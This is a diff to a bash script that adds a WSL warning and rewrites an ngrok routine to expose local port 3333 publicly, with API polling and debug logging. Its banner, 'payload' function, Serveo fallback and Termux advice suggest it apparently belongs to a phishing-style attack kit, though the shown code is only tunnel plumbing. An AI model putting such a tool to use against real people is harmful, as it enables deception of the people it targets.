@@ -27,6 +27,17 @@ case "$PLATFORM" in
 	*) ;;
 esac
 
+# Check if running in WSL (warning for user since they want non-WSL solutions)
+is_wsl() {
+	if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
+		return 0
+	fi
+	if [ -f /proc/sys/fs/binfmt_misc/WSLInterop ]; then
+		return 0
+	fi
+	return 1
+}
+
 # ============================================================================
 # Utilities
 # ============================================================================
@@ -278,31 +289,63 @@ try_ngrok() {
 		return 1
 	fi
 
+	printf "\e[1;92m[+] Using ngrok: $NGROK_CMD\e[0m\n"
+	
+	# Verify ngrok is executable
+	if ! $NGROK_CMD version > /dev/null 2>&1; then
+		printf "\e[1;31m[!] ngrok not executable or not working\e[0m\n"
+		return 1
+	fi
+	printf "\e[1;92m[+] ngrok version check: OK\e[0m\n"
+
 	# Start ngrok
 	printf "\e[1;92m[+] Starting ngrok http 3333...\e[0m\n"
 	$NGROK_CMD http 3333 > ngrok.log 2>&1 &
 	local ngrok_pid=$!
-	printf "\e[1;92m[+] ngrok PID: $ngrok_pid\e[0m\n"
+	printf "\e[1;92m[+] ngrok spawned with PID: $ngrok_pid\e[0m\n"
 	
-	# Give ngrok time to start
-	sleep 3
-	
+	# Give ngrok time to start and establish tunnel
+	sleep 4
+
+	# Verify ngrok process is still running
+	if ! kill -0 $ngrok_pid 2>/dev/null; then
+		printf "\e[1;31m[!] ngrok process died immediately\e[0m\n"
+		printf "\e[1;93m[DEBUG] ngrok.log output:\e[0m\n"
+		cat ngrok.log || true
+		return 1
+	fi
+	printf "\e[1;92m[✓] ngrok process still alive (PID: $ngrok_pid)\e[0m\n"
+
 	# Wait for tunnel and poll API
-	printf "\e[1;92m[+] Polling ngrok API (http://127.0.0.1:4040/api/tunnels)...\e[0m\n"
+	printf "\e[1;92m[+] Checking ngrok API at http://127.0.0.1:4040/api/tunnels\e[0m\n"
 	local link=""
 	local attempts=0
+	local max_attempts=60  # 60 seconds
 	
-	until [[ -n "$link" || $attempts -ge 50 ]]; do
+	while [[ -z "$link" && $attempts -lt $max_attempts ]]; do
 		sleep 1
+		attempts=$((attempts+1))
 		
-		# Try API first
+		printf "\r\e[1;92m[+] Polling attempt $attempts/$max_attempts...\e[0m" 
+		
+		# Try curl to ngrok API
 		if has_cmd curl; then
-			api_json=$(curl -s --connect-timeout 1 --max-time 2 http://127.0.0.1:4040/api/tunnels 2>/dev/null || true)
-			if [[ -n "$api_json" ]]; then
-				printf "\e[1;92m[DEBUG] API response received\e[0m\n"
-				link=$(echo "$api_json" | grep -o '"public_url":"https://[^"]*' | head -n1 | cut -d'"' -f4 || true)
+			local api_response=""
+			api_response=$(curl -s --connect-timeout 1 --max-time 2 http://127.0.0.1:4040/api/tunnels 2>&1 || true)
+			
+			if [[ -n "$api_response" ]]; then
+				printf "\e[0m\n"
+				printf "\e[1;92m[DEBUG] API response (attempt $attempts):\e[0m\n"
+				printf "$api_response" | head -3
+				printf "\e[0m\n"
+				
+				link=$(echo "$api_response" | grep -o '"public_url":"https://[^"]*' | head -n1 | cut -d'"' -f4 || true)
 				if [[ -z "$link" ]]; then
-					link=$(echo "$api_json" | grep -o 'https://[^/]*' | head -n1 || true)
+					link=$(echo "$api_response" | grep -o 'https://[^/]*' | head -n1 || true)
+				fi
+				
+				if [[ -n "$link" ]]; then
+					printf "\e[1;92m[✓] Got link from API: $link\e[0m\n"
 				fi
 			fi
 		fi
@@ -310,24 +353,36 @@ try_ngrok() {
 		# Fallback: grep ngrok.log
 		if [[ -z "$link" ]] && [[ -f ngrok.log ]]; then
 			link=$(grep -o 'https://[A-Za-z0-9.-]*ngrok[^ ]*' ngrok.log | head -n1 || true)
+			if [[ -n "$link" ]]; then
+				printf "\e[0m\n"
+				printf "\e[1;92m[✓] Got link from ngrok.log: $link\e[0m\n"
+			fi
 		fi
 		
-		# Show progress every 10 attempts
-		if (( attempts % 10 == 0 )); then
-			printf "\e[1;92m[+] Waiting for ngrok... (%d/50 attempts)\e[0m\n" "$attempts"
+		# Check if ngrok is still alive
+		if ! kill -0 $ngrok_pid 2>/dev/null; then
+			printf "\e[0m\n"
+			printf "\e[1;31m[!] ngrok process died at attempt $attempts\e[0m\n"
+			printf "\e[1;93m[DEBUG] ngrok.log (full):\e[0m\n"
+			cat ngrok.log || true
+			return 1
 		fi
-		
-		attempts=$((attempts+1))
 	done
+	
+	printf "\e[0m\n"
 
 	if [[ -n "$link" ]]; then
-		printf "\e[1;92m[✓] ngrok tunnel ready\e[0m\n"
+		printf "\e[1;92m[✓] ngrok tunnel ready after $attempts attempts\e[0m\n"
 		echo "$link"
 		return 0
 	else
-		printf "\e[1;93m[!] ngrok timeout or failed\e[0m\n"
-		printf "\e[1;93m[DEBUG] ngrok.log contents:\e[0m\n"
-		head -50 ngrok.log || true
+		printf "\e[1;31m[!] ngrok timeout after $max_attempts seconds\e[0m\n"
+		printf "\e[1;93m[DEBUG] ngrok.log (full output):\e[0m\n"
+		cat ngrok.log || true
+		printf "\n\e[1;93m[DEBUG] Checking if localhost:4040 is reachable:\e[0m\n"
+		if has_cmd curl; then
+			curl -v --connect-timeout 2 --max-time 2 http://127.0.0.1:4040/api/tunnels 2>&1 | head -20 || true
+		fi
 		kill $ngrok_pid 2>/dev/null || true
 		sleep 1
 		return 1
@@ -416,6 +471,22 @@ payload() {
 main() {
 	banner
 	dependencies
+
+	# Check if running in WSL and warn
+	if is_wsl; then
+		printf "\e[1;93m╔════════════════════════════════════════════════════════════╗\e[0m\n"
+		printf "\e[1;93m║\e[0m\e[1;31m              WARNING: Running in WSL2                        \e[0m\e[1;93m║\e[0m\n"
+		printf "\e[1;93m║\e[0m                                                            \e[1;93m║\e[0m\n"
+		printf "\e[1;93m║\e[0m  WSL networking may cause ngrok to fail. For best results:\e[0m\e[1;93m║\e[0m\n"
+		printf "\e[1;93m║\e[0m  - Use Git Bash (Windows native)\e[0m                            \e[1;93m║\e[0m\n"
+		printf "\e[1;93m║\e[0m  - Use Termux for Windows\e[0m                               \e[1;93m║\e[0m\n"
+		printf "\e[1;93m║\e[0m  - Or use Termux on Android for guaranteed success\e[0m       \e[1;93m║\e[0m\n"
+		printf "\e[1;93m║\e[0m                                                            \e[1;93m║\e[0m\n"
+		printf "\e[1;93m║\e[0m  Trying anyway... (Serveo will be fallback)\e[0m            \e[1;93m║\e[0m\n"
+		printf "\e[1;93m╚════════════════════════════════════════════════════════════╝\e[0m\n"
+		printf "\n"
+		sleep 3
+	fi
 
 	printf "\n\e[1;92m[*] Auto-setup mode\e[0m\n"
 
